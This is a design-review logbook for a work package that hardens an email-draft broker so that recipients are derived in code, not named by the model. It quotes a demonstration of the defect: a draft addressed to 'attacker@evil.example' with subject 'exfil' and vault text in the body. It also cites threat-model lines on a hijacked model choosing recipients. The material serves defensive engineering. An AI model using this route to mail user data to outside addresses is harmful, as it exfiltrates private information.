---
date: 2026-09-05
title: WP-audit-d-code-derived-recipients — design gate rounds
related_wps: [WP-audit-d-code-derived-recipients]
---

# WP-audit-d-code-derived-recipients — design gate rounds

## Round zero — architect, 2026-09-05, tree at `8c52808f`

Base: worktree `/Users/gyulafeher/Documents/Claude_Projects/wienerdog-wt/audit-d-design`,
branch `docs/wp-audit-d-code-derived-recipients`, `HEAD = 8c52808f = origin/main`.
Every measurement below was taken against that SHA. The stub the package matured
from carried citations measured on 2026-08-05 (tree `45f01d1`); all of them were
re-measured here and are recorded as file:line at `8c52808f`.

### Baselines actually run

**Suite** — `node tests/with-temp-root.js tests/run.js`, exit 0:

```text
ℹ tests 2630
ℹ suites 0
ℹ pass 2618
ℹ fail 0
ℹ cancelled 0
ℹ skipped 12
ℹ todo 0
ℹ duration_ms 50113.092375
```

**Lint** — `npm run lint`, exit 0 (run twice: once as the baseline, once after the
spec was written — both clean; the second run caught and then cleared one MD038):

```text
markdownlint-cli2 v0.23.0 (markdownlint v0.41.0)
Linting: 640 file(s)
Summary: 0 error(s)
--- shellcheck ---
--- PSScriptAnalyzer ---
--- frontmatter check ---
frontmatter check passed: 268 spec(s), 4 agent(s)
lint passed
```

**RED proofs** — `node scripts/red-proofs.js`, exit 0. Run on a `git archive`
scratch copy under the scratchpad with a copied `node_modules`, because the
worktree's `node_modules` is a symlink and `npm run red-proofs` refuses one:

```text
RED proofs — root .../scratchpad/rp-base
37 declared proof(s), 37 selected
PROVEN       dot-segment-admit-reverted  (WP-dot-segment-denial criterion 1)
… 37 rows, every one PROVEN …
PROVEN       WP-quarantine-preserve-durability criterion 7 — commit-clobbers-destination=PROVEN; …
```

### The defect, DRIVEN not argued

`registry.callTool('create_draft', …)` with a mocked Gmail client and a
`grantCheck` that always returns `false`. Script:
`…/scratchpad/drive-defect.js`. Output, verbatim:

```text
--- verb table facts ---
create_draft.capabilityClass = DRAFT
create_draft.inputSchema.properties.to = {"type":"string","maxLength":320,"pattern":"^[^\\r\\n]*$"}
create_draft.limits = {"maxCallsPerRun":10}
send_digest_to_self has a `to` property?  false
send_digest_to_self.limits = {"maxCallsPerRun":2}

--- the defect: model-named address, no grant ---
callTool returned: {"content":[{"type":"text","text":"{\"draftId\":\"d1\",\"messageId\":\"m1\"}"}]}
grantCheck consulted: 0 time(s)
drafts.create raw MIME decoded:
To: attacker@evil.example
Subject: exfil
Content-Type: text/plain; charset="UTF-8"

the vault says ...
getProfile called? false

--- pre-call-increment / no-refund on the counter ---
call 1 threw: broker verb create_draft failed
counter after a FAILED call: 1 (no refund)
```

So at `8c52808f`: an arbitrary model-named address reaches the draft's `To:`
header; the grant check is consulted **zero** times; and the 2026-08-05
pre-call-increment / no-refund fact **re-verifies** — a call that throws still
consumes a slot.

### The credential measurement that changed the design

`compositeServices` (`src/cli/gws-broker.js:53-82`) routes gmail methods per
capability class. Probed at `8c52808f` with fake per-class clients:

```text
DRAFT-only  -> getProfile? undefined | messages? undefined | drafts.create? function
READ+DRAFT  -> getProfile? function | messages.get? function | drafts.create? function | messages.send? undefined
```

`weekly-review` is DRAFT-only today (`runtime-profile.js:115`), and
`assembleRegistry` derives the classes to load from the profile's verbs alone
(`gws-broker.js:95`). A `create_draft_to_self` that calls `getProfile`, and a
`create_reply_draft` that calls `messages.get`, are therefore **unreachable** under
a DRAFT-only profile — they would have failed at call time behind the masked
`broker verb … failed` message. This is what produced the `extraClasses` field and
the `requiredClassesFor` helper, and it is Dispatch-precondition items 1 and 2.

### Consumer sweep (the stub deferred this to dispatch time; it ran here)

Two passes, every path literal: system `grep -rn` over
`src skills templates tests docs bin`, then a second repo-wide pass (excluding
`node_modules/` and `.git/`) that reaches the root files — which is where
`FIX-PLAN.md` was found; the first pass's scope does not include it. Both sweeps
read their targets — the output names files and line numbers, and no
`No such file` appeared on stderr. Every `create_draft` occurrence at `8c52808f`:

| Kind | Sites |
|---|---|
| Product code | `src/core/runtime-profile.js:103,:113,:115`; `src/gws/broker/verbs.js:154,:155` |
| Skills | `skills/wienerdog-inbox-triage/SKILL.md:13,:24,:33`; `skills/wienerdog-weekly-review/SKILL.md:13,:30,:35` |
| Live docs | `docs/GLOSSARY.md:36`; `docs/adr/0026-gws-capability-broker.md:152` |
| Tests | `tests/unit/broker-verbs.test.js` (5 sites); `broker-registry.test.js:38,:42,:50,:64,:68`; `broker-wiring.test.js:83,:84,:104,:107`; `routine-runtime.test.js:119`; `routines-skill-structure.test.js:147,:148` |
| Records (not rewritten) | `FIX-PLAN.md:525,:541`; `docs/specs/done/…`; `docs/security-audit/…` |
| **No hit** | `templates/`, `bin/`, `tests/scenarios/`, `tests/golden/`, `src/gws/gmail.js` beyond its single caller |

`gmail.draft` has exactly one PRODUCT caller (`verbs.js:171`) — the attended
`gws gmail draft` CLI that `docs/ARCHITECTURE.md:160` still describes no longer
reaches it. It has one further caller in the suite,
`tests/unit/gws-gmail.test.js:142` (corrected in the executor pass, below). `tests/scenarios/broker-e2e/` names no verb: `allowedMethodsFor`
(`run-broker-e2e.js:63-79`) derives permitted Google methods by regex over each
verb's `apiMethod`, and `gmail.users.getProfile` is exempt at `:256` — so the live
E2E harness needs no change, measured rather than assumed.

**Decision recorded: `create_draft` is DELETED, not merely de-allowlisted.** Zero
callers survive the split, and a record left in the frozen table is one allowlist
edit from reachable. The spec's criterion-1 universal is only true of the deleted
state (Dispatch-precondition item 3).

### Every citation re-measured (ranges checked at BOTH ends)

| Citation | Line content at `8c52808f` |
|---|---|
| `src/gws/broker/verbs.js:154` / `:172` | `create_draft: Object.freeze({` / `}),` |
| `verbs.js:165` / `:166` / `:167` / `:170` | the `to` / `subject` / `body` properties / `limits: { maxCallsPerRun: 10 },` |
| `verbs.js:21` | `const NO_CRLF = '^[^\\r\\n]*$';` |
| `verbs.js:52` | `max: { type: 'integer', min: 1, max: 20 },` (gmail_search) |
| `verbs.js:69` | `properties: { id: { type: 'string', maxLength: 128, pattern: '^[A-Za-z0-9_-]+$' } },` |
| `verbs.js:174` / `:206` | `send_digest_to_self: Object.freeze({` / `}),` |
| `verbs.js:181-183` / `:184-192` / `:193` / `:197-201` | zero-address comment / schema / `maxCallsPerRun: 2` / self-resolve + fail-loud |
| `src/gws/broker/registry.js:60-62` / `:69` / `:71` | service-absent refusal / `checkAndCount(…)` / the SEND-only grant gate |
| `src/gws/broker/limits.js:22` / `:28` | `function checkAndCount(state, verbName, limits) {` / `}` |
| `src/gws/gmail.js:18` / `:23` | `function assertHeaderSafe(value, field) {` / `}` |
| `gmail.js:31` / `:35` | `function header(headers, name) {` / `}` |
| `gmail.js:106` / `:123` | `async function read(services, opts) {` / `}` |
| `gmail.js:131` / `:142` | `async function draft(services, opts) {` / `}` |
| `gmail.js:150` / `:160` / `:162` | `function buildMime(m) {` / `}` / `module.exports = { search, read, draft, buildMime };` |
| `src/gws/scope-sets.js:24` | the DRAFT set — `gmail.compose` (the stub had no citation here; **:25 is SEND**, corrected) |
| `src/cli/gws-broker.js:53` / `:82` | `function compositeServices(byClass) {` / `}` |
| `gws-broker.js:63-70` / `:76-79` / `:95` / `:121-128` / `:167-170` | READ routing incl. getProfile / DRAFT routing / class derivation / class-unavailable refusal / the `compositeServices` export + its reason |
| `src/core/runtime-profile.js:103` / `:113` / `:115` | inbox-triage verbs / the comment / weekly-review verbs |
| `skills/wienerdog-inbox-triage/SKILL.md:13,:24,:33` | verb list / "call the `create_draft` tool with the sender as `to`" / "no send tool" |
| `skills/wienerdog-weekly-review/SKILL.md:13,:30,:35` | verb name / "with the user's own address as `to`" / "no send tool" |
| `docs/GLOSSARY.md:36` | broker-verb definition, `create_draft` in the example list |
| `docs/THREAT-MODEL.md:138` / `:140` / `:142` | T4a mitigations / the A12 residual / the 0.10.0 paragraph — `:140` and `:142` both say "name a new recipient" |
| `docs/adr/0026-gws-capability-broker.md:152-153` / `:200` / `:240-247` / `:475-520` | §2 draft bullet / D-SEND-SCOPE / §4 / Amendment 1 |
| `tests/scenarios/broker-e2e/run-broker-e2e.js:63` / `:79` / `:256` | `function allowedMethodsFor(profileId) {` / its closing `}` (`:78` is `return allowed;`) / the getProfile exemption |

**Stub citations that moved or were wrong**, all corrected in the matured spec:
the stub's `verbs.js:154/:165/:170` survived unchanged; `registry.js:71` survived;
`registry.js:69` survived; the stub's SKILL.md line numbers (weekly-review `:30`,
inbox-triage `:24`) survived. Nothing rotted between `45f01d1` and `8c52808f` —
but the ranges are now recorded at both ends, which the stub did not do.

### Template conformance diff (`docs/specs/_TEMPLATE.md`)

| Template section | In the spec |
|---|---|
| frontmatter (`id, title, status, model, size, depends_on, adrs, epic`) | present; `size: M`, `status: Draft`, `epic: audit-close`, `adrs: [ADR-0004, ADR-0026, ADR-0031]` |
| `## Context (read this, nothing else)` | present |
| `## Current state` | present |
| `## Deliverables (permission boundary — touch ONLY these)` | present, 15 rows |
| `### Exact contracts` | present |
| `## Contract reference` | present — the 2-of-7 trigger fires on (i), (iii), (vi), (vii), stated in place |
| `### Contract table(s)` | present — Tables A, B, C |
| `### Mirrored Surface Checklist` | present, 11 registered mirrors |
| `## Implementation notes & constraints` | present |
| `## Security checklist` | present; the template's path/shell checkbox is marked `N/A — <reason>` in place, two applicable items added |
| `## Acceptance criteria` | present, 11 numbered; the template's idempotence item is criterion 11, marked `N/A — <reason>` |
| `## Verification steps` | present, V1–V5 |
| `## Out of scope (do NOT do these)` | present |
| `## Definition of done` | present, all five items |
| *(extra)* `## Dispatch precondition — owner items` | present, 7 items — not a template section; the shape the current pipeline expects (`docs/specs/done/WP-quarantine-preserve-durability.md`) |

No template section is silently absent.

### Internal coherence pass — findings and dispositions

| # | Finding | Disposition |
|---|---|---|
| CF1 | **V5 as first drafted was over-strict** — it flagged `calendar_list.from` and `calendar_list.to`, which are ISO timestamps, so the hand-built COMPLIANT state went RED. A gate that punishes correct work. | **fix** — narrowed to `v.service === 'gmail'`, plus a non-vacuity guard that refuses when zero gmail verbs are found. Re-observed in all three states (below). |
| CF2 | **The DRAFT-only credential blocker** (measured above): both new verbs need READ-routed methods, and `weekly-review` loads DRAFT only. The naive split would have shipped a verb that always fails. | **fix** — `extraClasses` on the verb record + `requiredClassesFor` in `verbs.js`; parked as owner items 1 and 2. |
| CF3 | **Criterion 8 had product behaviour but no testable seam** — `assembleRegistry` is not exported from `src/cli/gws-broker.js`, so nothing could carry a RED proof. | **fix** — `requiredClassesFor` is defined and exported from `verbs.js` (a pure function over the verb table), which also keeps identity `[AUD-D6]` in the single declared suite. Table C moved 5→6 identities, 8→9 declarations, and its own count sentence was updated in the same edit. |
| CF4 | A naive `grep create_draft` for V4 also matches `create_draft_to_self`, so the check would never go green. | **fix** — the pattern requires a non-word character after the name: `create_draft($\|[^_A-Za-z0-9])`. Verified: zero hits on the COMPLIANT tree. |
| CF5 | V4's file list first included `docs/adr/0026-…` and `docs/THREAT-MODEL.md`; Amendment 2 legitimately names the deleted verb, so the check would have failed on correct work. | **fix** — the list is live product surfaces only (six paths), and the excluded record set is named in the verification block itself, so the universal carries its exception set in place. |
| CF6 | Two Table A cells used nested code spans (backticks inside a code span) and would not render. | **fix** |
| CF7 | markdownlint MD038 on `` `Re: ` `` (space inside a code span). | **fix** — reworded; `npm run lint` clean afterwards. |
| CF8 | V3's baseline note conflated the whole-tree `37 declared / 37 PROVEN` with this WP's own selection, which is `0 selected` until the implementer writes the declarations. | **fix** — both runs are now listed, with the absent-state VACUOUS red quoted. |
| CF9 | `docs/THREAT-MODEL.md:140` and `:142` both assert a hijacked model "cannot … name a new recipient". **False today for drafts.** | **residual until merge** — parked as owner item 6; the spec states that neither sentence needs editing because this WP is what makes them true, and the drafts sentence lands at `:138` with the code. |
| CF10 | `docs/ARCHITECTURE.md:160` still describes an attended `gws gmail draft` CLI surface; `gmail.draft` has one caller (`verbs.js:171`) and it is the broker verb. | **drop** — stale independently of this WP; routed to the PR's "Discovered issues", listed in Out of scope. |
| CF11 | `FIX-PLAN.md:525,:541` (`ST2` / `N-R2`) record exactly the residual this WP closes. | **drop** — a dated design-of-record is not rewritten when the thing it recorded changes; named in Out of scope with that reason. |
| CF12 | Table A first listed only the gmail verbs, so criterion 1's universal ("no verb…") quantified over nothing named. | **fix** — all nine live rows are in Table A, plus a struck row for the deleted verb. |

### Acceptance criteria and verification steps — RUN on the pinned base

| Item | Runnable at `8c52808f`? | Result / exit |
|---|---|---|
| V1 `node tests/with-temp-root.js tests/run.js` | yes | **0** — 2630/2618/0/12 (output above) |
| V2 `npm run lint` | yes | **0** |
| V3 `node scripts/red-proofs.js` (whole tree) | yes | **0** — 37 declared, 37 selected, all PROVEN |
| V3 `node scripts/red-proofs.js --wp WP-audit-d-code-derived-recipients` | yes | **1** — `VACUOUS: V2 — the selection matched no proof` (the deliverable-absent red) |
| V4 presence guard + sweep | yes | see the three-state table below |
| V5 address-field universal | yes | see the three-state table below |
| C1 (verb table / no address field) | partly — V5 covers the address half | **RED** at base: `create_draft.to` |
| C2–C6 (both verbs' behaviour) | no — they assert behaviour of code this WP creates; no runnable form exists on the pinned base | not run; recorded as not-yet-runnable |
| C7 (DRAFT never grant-gated) | no — same reason | not run |
| C8 (`requiredClassesFor`) | no — the helper does not exist yet | not run |
| C9 (`--allowedTools` strings) | yes | **RED**, and it discriminates — output below |
| C10 (all Table C declarations PROVEN) | no — declarations do not exist yet; the harness's own refusal is V3's selection row above | not run |
| C11 idempotence | `N/A` | — |

C9 on the pinned base, exit 1:

```text
FAIL inbox-triage
     got:      mcp__wienerdog-broker__gmail_search,mcp__wienerdog-broker__gmail_read,mcp__wienerdog-broker__create_draft
     expected: mcp__wienerdog-broker__gmail_search,mcp__wienerdog-broker__gmail_read,mcp__wienerdog-broker__create_reply_draft
FAIL weekly-review
     got:      mcp__wienerdog-broker__create_draft
     expected: mcp__wienerdog-broker__create_draft_to_self
```

This also confirms the exact strings criterion 9 pins are the ones
`composeClaudeArgs` really produces — the prefix and separator are observed, not
predicted.

### The two NEW verification steps, observed in all three states

Three scratch trees were built from `git archive HEAD`:
**ABSENT** (`src/gws/broker/verbs.js` and `skills/wienerdog-weekly-review/SKILL.md`
deleted), **COMPLIANT** (the verb split and every mirror hand-applied),
**VIOLATING** (compliant, plus a `to` property re-added to `create_draft_to_self`
and one `create_draft` mention restored in a `SKILL.md`).

| State | V4 presence guard | V4 sweep | V5 |
|---|---|---|---|
| Pinned base `8c52808f` | exit **0**, six paths listed | exit **0** — 12 hits (RED) | exit **1** — `create_draft.to` (RED) |
| **Deliverable ABSENT** | exit **1** — `ls` names both missing files (RED) | exit **2** — `grep: … No such file or directory` on stderr; a negated form would have read GREEN here (RED) | exit **1** — `require` throws (RED) |
| **COMPLIANT** | exit **0** | exit **1**, zero output (GREEN) | exit **0** — `V5 OK: no gmail verb input schema declares an address field (5 gmail verbs of 9 checked)` (GREEN) |
| **VIOLATING** | exit **0** | exit **0** — one hit, `skills/wienerdog-inbox-triage/SKILL.md:24`, the restored `create_draft` mention (RED) | exit **1** — `create_draft_to_self.to` (RED) |

The ABSENT column is why V4 leads with `ls -1` rather than a negated grep: with the
file gone, `grep` exits 2 and any `! grep -q` form would have reported success
exactly where the work was never done.

The over-strictness caught by CF1 is the other half of the both-directions rule:
V5's first draft was RED on the COMPLIANT tree
(`address-bearing verb input(s): calendar_list.from, calendar_list.to`) and would
have punished a correct implementation. It never reached the spec.

### Owner items parked (the spec's Dispatch precondition)

Each carries a recommendation; the session may dispatch under them (standing
instruction, `docs/specs/logbook/2026-09-05-owner-rulings-durability-queue.md`).

1. `weekly-review`'s broker gains the READ credential — **recommend yes**; the
   model's reachable surface is unchanged. Overruling leaves only item 2.
2. Keep or drop weekly-review's email draft — **recommend keep**. Overruling
   deletes `create_draft_to_self`, makes the routine `mcp:'empty'`, and costs the
   user the emailed weekly review.
3. Delete `create_draft` vs. de-allowlist it — **recommend delete**. Overruling
   makes V5 unsatisfiable and the title claim false.
4. `Reply-To` before `From` — **recommend yes**; the residual is identical either
   way. Overruling breaks list/aliased mail for no gain.
5. Caps 3 and 10, movers named in Table A — **recommend as written**. Overruling to
   1 loses the week's draft to a single transient error (measured no-refund).
6. T4a's "cannot name a new recipient" is false today — **recommend no separate
   patch**; it lands with the code. Overruling costs an interim commit and a
   rewrite.
7. Table B's address rule is narrower than RFC 5322 — **recommend accept the
   narrowing**. Overruling admits addresses the broker cannot reason about on the
   one field an attacker fully controls.

### STOP CRITERION for the external loop — pinned BEFORE round 1

**The loop closes** when one full round returns **no product finding on either
channel** (Codex plugin adversarial review and the hermetic Codex shadow) —
"product" per Weighted closure: `src/` behaviour, the ADR contract, or anything a
user or a consuming model observes. Machinery findings still open at that point are
fixed within the existing surface or accepted as named residuals in the spec; they
do **not** extend the loop, and verification machinery may grow only to guard a
product behaviour, in the smallest form that guards it.

**Escalation, both directions:**

- **(i) Repeat-kind → extraction, never a third patch.** If two consecutive rounds
  land findings on the *same* contract family — the verb table (Table A), the
  reply derivation (Table B), or the RED proofs (Table C) — the next step is an
  ADR-0031 contract-extraction pass on that family, not another textual fix: pull
  the scattered facts into the canonical table, update every registered mirror, and
  register any newly-found mirror in the same pass. Then resume.
- **(ii) Owner-boundary findings PARK, they do not get folded.** A finding whose
  only honest fix would change an owner-ruled value (the caps in Table A), add a
  grant, widen a `brokerVerbs` allowlist or an OAuth scope set, or reopen a
  rejected alternative (mandatory-self; gating DRAFT behind a grant) is recorded as
  a new Dispatch-precondition item with a recommendation and its overrule cost —
  never folded into the spec silently. Diff size does not measure contract impact.
- **(iii) Scope objections.** The focus text states the package's boundaries up
  front (no grant is added, no scope changes, `send_digest_to_self` and the E2E
  harness are out of scope, and the reply-recipient residual is accepted by
  ruling). A reviewer disagreeing with a boundary files it as a scope objection in
  the routed section rather than counting it toward the verdict.

Raw reviewer output is committed **before** adjudication, and each round's row here
cites the raw file's path **and the SHA of the commit that introduced it**.

## Round zero — orchestrator executors, 2026-09-05, on `4c968eeb`

Two clean-context executors ran on the round-zero tip, each given only the
artifacts and the reference document.

**Template conformance: CONFORMS.** No blocking item; no template section
silently absent.

**Internal coherence (clean context): 8 findings, all machinery/wording — LIGHT
under Weighted closure, so they folded into the tip before external round 1
rather than opening a round.** Everything else the executor checked reproduced:
~50 citations at both ends, the `compositeServices` DRAFT-only / READ+DRAFT block,
the attacker-draft demonstration with `grantCheck` consulted 0 times, the
no-refund counter, V1 2630/2618/0/12, V2 exit 0, V3 `--wp` correctly RED
(`VACUOUS: the selection matched no proof`), V4 sweep RED (13 hits — the
executor's count includes the spec's own text, which the six-path V4 list
excludes), V5 RED (`create_draft.to`). **No product finding; the stop criterion is
untouched, and no owner item or Table A/B value moved in this pass.**

| # | Finding | Disposition |
|---|---|---|
| E1 | Deliverables row for `tests/unit/broker-verbs.test.js` said "the five new identities of Table C"; Table C has six. | **fix** — the cell no longer predicts a count: it says "every test identity named in **Table C**", and also records the verb-table pin moving eight names → nine. |
| E2 | Deliverables row for the `.proofs.json` said "the eight declarations of Table C"; Table C has nine rows. | **fix** — same treatment: "one declaration per **Table C** row", plus the `suite` value the file must carry. Both cells were re-read whole afterwards; neither predicts any other Table C content. |
| E3 | `allowedMethodsFor` cited as `run-broker-e2e.js:63-78`; the closing brace is `:79` (`:78` is `return allowed;`). | **fix** — both spec sites and the logbook citation row corrected to `:63-79`. |
| E4 | "`gmail.draft` has exactly one caller in the tree" is false — `tests/unit/gws-gmail.test.js:142` calls it directly. | **fix** — the universal narrows to one PRODUCT caller and names the unit-test caller as its exception. **Measured, not assumed:** the additive `buildMime`/`draft` extension was applied to a scratch copy and `tests/unit/gws-gmail.test.js` passed **9/9 unchanged** (with `inReplyTo`/`references`/`threadId` absent the bytes and request body are identical), so that file stays OUT of Deliverables. |
| E5 | The sweep's stated scope (`src skills templates tests docs bin`) does not reach `FIX-PLAN.md`, which it nonetheless cites. | **fix** — both the spec and this record now state the two passes and say which one found the root file. |
| E6 | **The one finding with teeth.** Table C's `reply-fetch-failure-drafts-anyway` mutation ("continue with an empty header set") lands on Table B's own "both empty → refuse", producing the SAME zero-draft observable as correct code — `evaluateRed`'s equality would have made it a vacuous proof. | **fix** — restated so the mutant DRAFTS (a literal fallback recipient and subject). The other eight rows were re-checked for the same shape: all produce a different observable, but two carry a masking trap, now named in the spec — `reply-address-pattern-dropped` needs a candidate that fails the pattern **without** CR/LF, and `reply-recipient-not-derived` needs a `body` address **different** from the header's. A general sentence stating the requirement was added above them. |
| E7 | "Criteria 1, 7, 9 and 11 carry no declaration" omits criterion 10. | **fix** (not left) — 10 is added with its reason: it is the meta-check over Table C and cannot declare a proof of itself; V3 is its check. |
| E8 | Mirrored Surface Checklist said "the four test rows" without naming them. | **fix** — the four verb-name-pinning test files are spelled out. |

### Round table

| Round | Channel | Raw file | Raw-commit SHA | Verdict |
|---|---|---|---|---|
| 0 | architect (this record) | — | — | template-conformant; 12 coherence findings dispositioned; V4/V5 proven in three states; 7 owner items parked; stop criterion pinned |
